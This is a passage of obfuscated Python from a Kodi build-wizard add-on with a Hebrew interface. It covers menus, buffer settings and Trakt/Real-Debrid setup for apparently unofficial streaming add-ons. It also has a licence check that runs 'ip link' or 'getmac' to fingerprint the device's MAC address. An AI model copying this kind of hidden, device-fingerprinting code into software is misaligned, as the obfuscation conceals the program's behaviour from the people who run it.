				OOO00O0OO0OO0O0O0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0000OOO0OOOOO0OO )#line:1692
		if isinstance (ret ,str ):#line:1694
			OOOO0OOO000OO0OO0 =[]#line:1695
			for OOOOOO000O00O000O in OOO00O0OO0OO0O0O0 :#line:1696
				OOO00000O0OOOOOO0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOOOO000O00O000O )#line:1697
				if len (OOO00000O0OOOOOO0 )==0 :#line:1698
					OOO00000O0OOOOOO0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOOOO000O00O000O )#line:1699
				for O0OOO0O0OO0OO0000 in OOO00000O0OOOOOO0 :#line:1700
					OO0OOOOO00OOOOO00 =O0OOO0O0OO0OO0000 [0 ]#line:1701
					if OO0OOOOO00OOOOO00 in "'\"":#line:1702
						if O0OOO0O0OO0OO0000 .find ('='+OO0OOOOO00OOOOO00 ,O0OOO0O0OO0OO0000 .find (OO0OOOOO00OOOOO00 ,1 ))>-1 :#line:1703
							O0OOO0O0OO0OO0000 =O0OOO0O0OO0OO0000 [:O0OOO0O0OO0OO0000 .find ('='+OO0OOOOO00OOOOO00 ,O0OOO0O0OO0OO0000 .find (OO0OOOOO00OOOOO00 ,1 ))]#line:1704
						if O0OOO0O0OO0OO0000 .rfind (OO0OOOOO00OOOOO00 ,1 )>-1 :#line:1706
							O0OOO0O0OO0OO0000 =O0OOO0O0OO0OO0000 [1 :O0OOO0O0OO0OO0000 .rfind (OO0OOOOO00OOOOO00 )]#line:1707
					else :#line:1708
						if O0OOO0O0OO0OO0000 .find (" ")>0 :#line:1709
							O0OOO0O0OO0OO0000 =O0OOO0O0OO0OO0000 [:O0OOO0O0OO0OO0000 .find (" ")]#line:1710
						elif O0OOO0O0OO0OO0000 .find ("/")>0 :#line:1711
							O0OOO0O0OO0OO0000 =O0OOO0O0OO0OO0000 [:O0OOO0O0OO0OO0000 .find ("/")]#line:1712
						elif O0OOO0O0OO0OO0000 .find (">")>0 :#line:1713
							O0OOO0O0OO0OO0000 =O0OOO0O0OO0OO0000 [:O0OOO0O0OO0OO0000 .find (">")]#line:1714
					OOOO0OOO000OO0OO0 .append (O0OOO0O0OO0OO0000 .strip ())#line:1716
			OOO00O0OO0OO0O0O0 =OOOO0OOO000OO0OO0 #line:1717
		else :#line:1718
			OOOO0OOO000OO0OO0 =[]#line:1719
			for OOOOOO000O00O000O in OOO00O0OO0OO0O0O0 :#line:1720
				O0OOO00OOO000000O =u"</"+name #line:1721
				O00OOOOO0OOOOOO0O =O0000OOO0OOOOO0OO .find (OOOOOO000O00O000O )#line:1723
				O00OO0OO000OOOOO0 =O0000OOO0OOOOO0OO .find (O0OOO00OOO000000O ,O00OOOOO0OOOOOO0O )#line:1724
				O000000O0O00OO0OO =O0000OOO0OOOOO0OO .find ("<"+name ,O00OOOOO0OOOOOO0O +1 )#line:1725
				while O000000O0O00OO0OO <O00OO0OO000OOOOO0 and O000000O0O00OO0OO !=-1 :#line:1727
					O000O0OO000O0O0OO =O0000OOO0OOOOO0OO .find (O0OOO00OOO000000O ,O00OO0OO000OOOOO0 +len (O0OOO00OOO000000O ))#line:1728
					if O000O0OO000O0O0OO !=-1 :#line:1729
						O00OO0OO000OOOOO0 =O000O0OO000O0O0OO #line:1730
					O000000O0O00OO0OO =O0000OOO0OOOOO0OO .find ("<"+name ,O000000O0O00OO0OO +1 )#line:1731
				if O00OOOOO0OOOOOO0O ==-1 and O00OO0OO000OOOOO0 ==-1 :#line:1733
					OO0O00O0000OO0OOO =u""#line:1734
				elif O00OOOOO0OOOOOO0O >-1 and O00OO0OO000OOOOO0 >-1 :#line:1735
					OO0O00O0000OO0OOO =O0000OOO0OOOOO0OO [O00OOOOO0OOOOOO0O +len (OOOOOO000O00O000O ):O00OO0OO000OOOOO0 ]#line:1736
				elif O00OO0OO000OOOOO0 >-1 :#line:1737
					OO0O00O0000OO0OOO =O0000OOO0OOOOO0OO [:O00OO0OO000OOOOO0 ]#line:1738
				elif O00OOOOO0OOOOOO0O >-1 :#line:1739
					OO0O00O0000OO0OOO =O0000OOO0OOOOO0OO [O00OOOOO0OOOOOO0O +len (OOOOOO000O00O000O ):]#line:1740
				if ret :#line:1742
					O0OOO00OOO000000O =O0000OOO0OOOOO0OO [O00OO0OO000OOOOO0 :O0000OOO0OOOOO0OO .find (">",O0000OOO0OOOOO0OO .find (O0OOO00OOO000000O ))+1 ]#line:1743
					OO0O00O0000OO0OOO =OOOOOO000O00O000O +OO0O00O0000OO0OOO +O0OOO00OOO000000O #line:1744
				O0000OOO0OOOOO0OO =O0000OOO0OOOOO0OO [O0000OOO0OOOOO0OO .find (OO0O00O0000OO0OOO ,O0000OOO0OOOOO0OO .find (OOOOOO000O00O000O ))+len (OO0O00O0000OO0OOO ):]#line:1746
				OOOO0OOO000OO0OO0 .append (OO0O00O0000OO0OOO )#line:1747
			OOO00O0OO0OO0O0O0 =OOOO0OOO000OO0OO0 #line:1748
		O0O0OOO00OOOO0000 +=OOO00O0OO0OO0O0O0 #line:1749
	return O0O0OOO00OOOO0000 #line:1751
def addItem (OOOOOO0OOOOOO0O00 ,OO0000OOO00OO0O00 ,O0000O0000O00OOOO ,O00O0000O0O00OO00 ,OO0OOO0OOOO0OOO0O ,description =None ):#line:1753
	if description ==None :description =''#line:1754
	description ='[COLOR white]'+description +'[/COLOR]'#line:1755
	OOOOO0OOO0000000O =sys .argv [0 ]+"?url="+urllib .quote_plus (OO0000OOO00OO0O00 )+"&mode="+str (O0000O0000O00OOOO )+"&name="+urllib .quote_plus (OOOOOO0OOOOOO0O00 )+"&iconimage="+urllib .quote_plus (O00O0000O0O00OO00 )+"&fanart="+urllib .quote_plus (OO0OOO0OOOO0OOO0O )#line:1756
	OOO0000OO000O0O0O =True #line:1757
	O0O000O0OO0O0O000 =xbmcgui .ListItem (OOOOOO0OOOOOO0O00 ,iconImage =O00O0000O0O00OO00 ,thumbnailImage =O00O0000O0O00OO00 )#line:1758
	O0O000O0OO0O0O000 .setInfo (type ="Video",infoLabels ={"Title":OOOOOO0OOOOOO0O00 ,"Plot":description })#line:1759
	O0O000O0OO0O0O000 .setProperty ("fanart_Image",OO0OOO0OOOO0OOO0O )#line:1760
	O0O000O0OO0O0O000 .setProperty ("icon_Image",O00O0000O0O00OO00 )#line:1761
	OOO0000OO000O0O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOO0OOO0000000O ,listitem =O0O000O0OO0O0O000 ,isFolder =False )#line:1762
	return OOO0000OO000O0O0O #line:1763
def get_params ():#line:1765
		O0OOO00O0OO00OOO0 =[]#line:1766
		OO00O0OO00O0OO0O0 =sys .argv [2 ]#line:1767
		if len (OO00O0OO00O0OO0O0 )>=2 :#line:1768
				OOOO0OO000OOOOO00 =sys .argv [2 ]#line:1769
				OOOO0OOO0O0OOO0O0 =OOOO0OO000OOOOO00 .replace ('?','')#line:1770
				if (OOOO0OO000OOOOO00 [len (OOOO0OO000OOOOO00 )-1 ]=='/'):#line:1771
						OOOO0OO000OOOOO00 =OOOO0OO000OOOOO00 [0 :len (OOOO0OO000OOOOO00 )-2 ]#line:1772
				O0OOO0O0000OO00O0 =OOOO0OOO0O0OOO0O0 .split ('&')#line:1773
				O0OOO00O0OO00OOO0 ={}#line:1774
				for OOOO00O000O0000O0 in range (len (O0OOO0O0000OO00O0 )):#line:1775
						OOOO0OOO0OOOOO00O ={}#line:1776
						OOOO0OOO0OOOOO00O =O0OOO0O0000OO00O0 [OOOO00O000O0000O0 ].split ('=')#line:1777
						if (len (OOOO0OOO0OOOOO00O ))==2 :#line:1778
								O0OOO00O0OO00OOO0 [OOOO0OOO0OOOOO00O [0 ]]=OOOO0OOO0OOOOO00O [1 ]#line:1779
		return O0OOO00O0OO00OOO0 #line:1781
def decode (OO0000O0OOO0OO00O ,O0OOO0O00OOOOO000 ):#line:1786
    import base64 #line:1787
    O00OOOO0OOOO00O0O =[]#line:1788
    if (len (OO0000O0OOO0OO00O ))!=4 :#line:1790
     return 10 #line:1791
    O0OOO0O00OOOOO000 =base64 .urlsafe_b64decode (O0OOO0O00OOOOO000 )#line:1792
    for OO00OOO00O000OO00 in range (len (O0OOO0O00OOOOO000 )):#line:1794
        O00000O0OO0OOOO0O =OO0000O0OOO0OO00O [OO00OOO00O000OO00 %len (OO0000O0OOO0OO00O )]#line:1795
        OO000000OOO0OOO0O =chr ((256 +ord (O0OOO0O00OOOOO000 [OO00OOO00O000OO00 ])-ord (O00000O0OO0OOOO0O ))%256 )#line:1796
        O00OOOO0OOOO00O0O .append (OO000000OOO0OOO0O )#line:1797
    return "".join (O00OOOO0OOOO00O0O )#line:1798
def tmdb_list (O0O0O00OO0000OOOO ):#line:1799
    O0OO0OOO00O0OO0OO =decode ("7643",O0O0O00OO0000OOOO )#line:1802
    return int (O0OO0OOO00O0OO0OO )#line:1805
def u_list (OO0OOOOO0O00OOOOO ):#line:1806
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1808
        from math import sqrt #line:1809
        OOO00000OO0OO0O00 =tmdb_list (TMDB_NEW_API )#line:1810
        OO0O0O0O0O0O0OO00 =str ((getHwAddr ('eth0'))*OOO00000OO0OO0O00 )#line:1812
        OO0OO000OO00OO0O0 =int (OO0O0O0O0O0O0OO00 [1 ]+OO0O0O0O0O0O0OO00 [2 ]+OO0O0O0O0O0O0OO00 [5 ]+OO0O0O0O0O0O0OO00 [7 ])#line:1813
        O00000OO0OO00OOOO =(ADDON .getSetting ("pass"))#line:1815
        O00OO00OO00OOO000 =(str (round (sqrt ((OO0OO000OO00OO0O0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1820
        if '.'in O00OO00OO00OOO000 :#line:1822
         O00OO00OO00OOO000 =(str (round (sqrt ((OO0OO000OO00OO0O0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1823
        if O00000OO0OO00OOOO ==O00OO00OO00OOO000 :#line:1825
          OOOOO0O00O0OOOO0O =OO0OOOOO0O00OOOOO #line:1827
        else :#line:1829
           if STARTP2 ()and STARTP ()=='ok':#line:1830
             return OO0OOOOO0O00OOOOO #line:1833
           OOOOO0O00O0OOOO0O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1834
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1835
           sys .exit ()#line:1836
        return OOOOO0O00O0OOOO0O #line:1837
    else :#line:1838
        STARTP ()#line:1839
def disply_hwr ():#line:1843
   try :#line:1844
    OOOOO0O0O0O0O0OOO =tmdb_list (TMDB_NEW_API )#line:1845
    O00O0O000O0OOOO0O =str ((getHwAddr ('eth0'))*OOOOO0O0O0O0O0OOO )#line:1846
    OOOOOO0000OO0O00O =(O00O0O000O0OOOO0O [1 ]+O00O0O000O0OOOO0O [2 ]+O00O0O000O0OOOO0O [5 ]+O00O0O000O0OOOO0O [7 ])#line:1853
    OOOOO0OO0OO00OOOO =(ADDON .getSetting ("action"))#line:1854
    wiz .setS ('action',str (OOOOOO0000OO0O00O ))#line:1856
   except :pass #line:1857
def disply_hwr2 ():#line:1858
   try :#line:1859
    OOO00000O0O0O0O00 =tmdb_list (TMDB_NEW_API )#line:1860
    OOOO0OOOO0O0OOOOO =str ((getHwAddr ('eth0'))*OOO00000O0O0O0O00 )#line:1862
    O0O0OO00OOO0O0OO0 =(OOOO0OOOO0O0OOOOO [1 ]+OOOO0OOOO0O0OOOOO [2 ]+OOOO0OOOO0O0OOOOO [5 ]+OOOO0OOOO0O0OOOOO [7 ])#line:1871
    OOOOOO0OOO000O0O0 =(ADDON .getSetting ("action"))#line:1872
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O0OO00OOO0O0OO0 )#line:1875
   except :pass #line:1876
def getHwAddr (O000OOOO0O0OOOO0O ):#line:1878
   import subprocess ,time #line:1879
   OO00OOO00OOOO0OOO ='windows'#line:1880
   if xbmc .getCondVisibility ('system.platform.android'):#line:1881
       OO00OOO00OOOO0OOO ='android'#line:1882
   if xbmc .getCondVisibility ('system.platform.android'):#line:1883
     O0O0OO0000OOO0O0O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1884
     OO00000O0O00000O0 =re .compile ('link/ether (.+?) brd').findall (str (O0O0OO0000OOO0O0O ))#line:1886
     OO000OO000OOO00O0 =0 #line:1887
     for O0O00OOOOOOOOOOO0 in OO00000O0O00000O0 :#line:1888
      if OO00000O0O00000O0 !='00:00:00:00:00:00':#line:1889
          O0O0O0OOOOO00O00O =O0O00OOOOOOOOOOO0 #line:1890
          OO000OO000OOO00O0 =OO000OO000OOO00O0 +int (O0O0O0OOOOO00O00O .replace (':',''),16 )#line:1891
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1893
       O0OOOO000000OOOOO =0 #line:1894
       OO000OO000OOO00O0 =0 #line:1895
       O00O0O0O000000OO0 =[]#line:1896
       O0OOO0O00000OOO0O =os .popen ("getmac").read ()#line:1897
       O0OOO0O00000OOO0O =O0OOO0O00000OOO0O .split ("\n")#line:1898
       for OOOOO0O000000O0O0 in O0OOO0O00000OOO0O :#line:1900
            O000OOO0000OOOO0O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOOO0O000000O0O0 ,re .I )#line:1901
            if O000OOO0000OOOO0O :#line:1902
                OO00000O0O00000O0 =O000OOO0000OOOO0O .group ().replace ('-',':')#line:1903
                O00O0O0O000000OO0 .append (OO00000O0O00000O0 )#line:1904
                OO000OO000OOO00O0 =OO000OO000OOO00O0 +int (OO00000O0O00000O0 .replace (':',''),16 )#line:1907
   else :#line:1909
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1910
   try :#line:1927
    return OO000OO000OOO00O0 #line:1928
   except :pass #line:1929
def getpass ():#line:1930
	disply_hwr2 ()#line:1932
def setpass ():#line:1933
    OO0O000O0OO000O0O =xbmcgui .Dialog ()#line:1934
    OO00OO0O00O0OOO0O =''#line:1935
    O00OO0OO0O0OOO00O =xbmc .Keyboard (OO00OO0O00O0OOO0O ,'הכנס סיסמה')#line:1937
    O00OO0OO0O0OOO00O .doModal ()#line:1938
    if O00OO0OO0O0OOO00O .isConfirmed ():#line:1939
           O00OO0OO0O0OOO00O =O00OO0OO0O0OOO00O .getText ()#line:1940
    wiz .setS ('pass',str (O00OO0OO0O0OOO00O ))#line:1941
def setuname ():#line:1942
    OOO0000O0OO0000OO =''#line:1943
    OOOOO0OOO0O0OO00O =xbmc .Keyboard (OOO0000O0OO0000OO ,'הכנס שם משתמש')#line:1944
    OOOOO0OOO0O0OO00O .doModal ()#line:1945
    if OOOOO0OOO0O0OO00O .isConfirmed ():#line:1946
           OOO0000O0OO0000OO =OOOOO0OOO0O0OO00O .getText ()#line:1947
           wiz .setS ('user',str (OOO0000O0OO0000OO ))#line:1948
def powerkodi ():#line:1949
    os ._exit (1 )#line:1950
def buffer1 ():#line:1952
	OO0O0O00O00O0OOO0 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1953
	O00OOOO000000O0OO =xbmc .getInfoLabel ("System.Memory(total)")#line:1954
	OO000OO0000O00OO0 =xbmc .getInfoLabel ("System.FreeMemory")#line:1955
	OOOO0000OO0O0O00O =re .sub ('[^0-9]','',OO000OO0000O00OO0 )#line:1956
	OOOO0000OO0O0O00O =int (OOOO0000OO0O0O00O )/3 #line:1957
	OO00OOO0OOO0OOOO0 =OOOO0000OO0O0O00O *1024 *1024 #line:1958
	try :O0O00OO0000O0O00O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1959
	except :O0O00OO0000O0O00O =16 #line:1960
	O0OOOOOO00O0O0O00 =DIALOG .yesno ('FREE MEMORY: '+str (OO000OO0000O00OO0 ),'Based on your free Memory your optimal buffersize is: '+str (OOOO0000OO0O0O00O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1963
	if O0OOOOOO00O0O0O00 ==1 :#line:1964
		with open (OO0O0O00O00O0OOO0 ,"w")as O0OOO000OOO0000OO :#line:1965
			if O0O00OO0000O0O00O >=17 :O00O0000000O00000 =xml_data_advSettings_New (str (OO00OOO0OOO0OOOO0 ))#line:1966
			else :O00O0000000O00000 =xml_data_advSettings_old (str (OO00OOO0OOO0OOOO0 ))#line:1967
			O0OOO000OOO0000OO .write (O00O0000000O00000 )#line:1969
			DIALOG .ok ('Buffer Size Set to: '+str (OO00OOO0OOO0OOOO0 ),'Please restart Kodi for settings to apply.','')#line:1970
	elif O0OOOOOO00O0O0O00 ==0 :#line:1972
		OO00OOO0OOO0OOOO0 =_OO0OO0OO000O0O0O0 (default =str (OO00OOO0OOO0OOOO0 ),heading ="INPUT BUFFER SIZE")#line:1973
		with open (OO0O0O00O00O0OOO0 ,"w")as O0OOO000OOO0000OO :#line:1974
			if O0O00OO0000O0O00O >=17 :O00O0000000O00000 =xml_data_advSettings_New (str (OO00OOO0OOO0OOOO0 ))#line:1975
			else :O00O0000000O00000 =xml_data_advSettings_old (str (OO00OOO0OOO0OOOO0 ))#line:1976
			O0OOO000OOO0000OO .write (O00O0000000O00000 )#line:1977
			DIALOG .ok ('Buffer Size Set to: '+str (OO00OOO0OOO0OOOO0 ),'Please restart Kodi for settings to apply.','')#line:1978
def xml_data_advSettings_old (OOO0O000O00O0OOO0 ):#line:1979
	OO000O000OO000000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOO0O000O00O0OOO0 #line:1989
	return OO000O000OO000000 #line:1990
def xml_data_advSettings_New (O00OO0OO00000OOO0 ):#line:1992
	O0O00OO0OO0OOOOOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00OO0OO00000OOO0 #line:2004
	return O0O00OO0OO0OOOOOO #line:2005
def write_ADV_SETTINGS_XML (OOOO0O0O00O0O0O00 ):#line:2006
    if not os .path .exists (xml_file ):#line:2007
        with open (xml_file ,"w")as OO000OOOO0OOOOO00 :#line:2008
            OO000OOOO0OOOOO00 .write (xml_data )#line:2009
def _OO0OO0OO000O0O0O0 (default ="",heading ="",hidden =False ):#line:2010
    ""#line:2011
    OOOO0O0O0O00000OO =xbmc .Keyboard (default ,heading ,hidden )#line:2012
    OOOO0O0O0O00000OO .doModal ()#line:2013
    if (OOOO0O0O0O00000OO .isConfirmed ()):#line:2014
        return unicode (OOOO0O0O0O00000OO .getText (),"utf-8")#line:2015
    return default #line:2016
def index ():#line:2018
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2019
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2020
	if AUTOUPDATE =='Yes':#line:2021
		if wiz .workingURL (WIZARDFILE )==True :#line:2022
			OO00O00OOOO000OO0 =wiz .checkWizard ('version')#line:2023
			if OO00O00OOOO000OO0 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO00O00OOOO000OO0 ),'wizardupdate',themeit =THEME2 )#line:2024
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2025
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2026
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2027
	if len (BUILDNAME )>0 :#line:2028
		O00O00O0000O0O0OO =wiz .checkBuild (BUILDNAME ,'version')#line:2029
		O0O00O000OOOOO0O0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2030
		if O00O00O0000O0O0OO >BUILDVERSION :O0O00O000OOOOO0O0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O00O000OOOOO0O0 ,O00O00O0000O0O0OO )#line:2031
		addDir (O0O00O000OOOOO0O0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2033
		try :#line:2035
		     OOO0O00000OOOO0OO =wiz .themeCount (BUILDNAME )#line:2036
		except :#line:2037
		   OOO0O00000OOOO0OO =False #line:2038
		if not OOO0O00000OOOO0OO ==False :#line:2039
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2040
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2041
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2044
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2045
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2046
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2050
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2052
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2054
def morsetup ():#line:2056
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2057
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2058
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2059
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2061
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2065
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2066
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2069
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2070
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2080
	setView ('files','viewType')#line:2081
def morsetup2 ():#line:2082
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2083
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2084
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2085
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2086
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2087
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2088
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
def fastupdate ():#line:2094
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2095
def forcefastupdate ():#line:2097
			O00OOOO0O0O000O0O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2098
			wiz .ForceFastUpDate (ADDONTITLE ,O00OOOO0O0O000O0O )#line:2099
def rdsetup ():#line:2103
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2104
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2105
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2107
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2108
def traktsetup ():#line:2111
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2112
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2113
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2114
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2115
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2116
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	setView ('files','viewType')#line:2119
def setautorealdebrid ():#line:2120
    from resources .libs import real_debrid #line:2121
    O00OO0OOOO0O00OO0 =real_debrid .RealDebridFirst ()#line:2122
    O00OO0OOOO0O00OO0 .auth ()#line:2123
def setrealdebrid ():#line:2125
    OO0OO00O000000OOO =(ADDON .getSetting ("auto_rd"))#line:2126
    if OO0OO00O000000OOO =='false':#line:2127
       ADDON .openSettings ()#line:2128
    else :#line:2129
        from resources .libs import real_debrid #line:2130
        OO0000O00OOOOO0O0 =real_debrid .RealDebrid ()#line:2131
        OO0000O00OOOOO0O0 .auth ()#line:2132
        rdon ()#line:2135
def resolveurlsetup ():#line:2137
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2138
def urlresolversetup ():#line:2139
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2140
def placentasetup ():#line:2142
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2143
def reptiliasetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2145
def flixnetsetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2147
def yodasetup ():#line:2148
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2149
def numberssetup ():#line:2150
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2151
def uranussetup ():#line:2152
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2153
def genesissetup ():#line:2154
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2155
def net_tools (view =None ):#line:2157
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2158
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2159
	setView ('files','viewType')#line:2161
def speedMenu ():#line:2162
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2163
def viewIP ():#line:2164
	O00OO00OOOOOO00OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2178
	O0O0OOOO0O000OOO0 =[];O00O0O0OO00O0O000 =0 #line:2179
	for OO00OOOOO0O00O0OO in O00OO00OOOOOO00OO :#line:2180
		O0O00O0O0O00OO00O =wiz .getInfo (OO00OOOOO0O00O0OO )#line:2181
		OO000OO0OOOOO0OOO =0 #line:2182
		while O0O00O0O0O00OO00O =="Busy"and OO000OO0OOOOO0OOO <10 :#line:2183
			O0O00O0O0O00OO00O =wiz .getInfo (OO00OOOOO0O00O0OO );OO000OO0OOOOO0OOO +=1 ;wiz .log ("%s sleep %s"%(OO00OOOOO0O00O0OO ,str (OO000OO0OOOOO0OOO )));xbmc .sleep (1000 )#line:2184
		O0O0OOOO0O000OOO0 .append (O0O00O0O0O00OO00O )#line:2185
		O00O0O0OO00O0O000 +=1 #line:2186
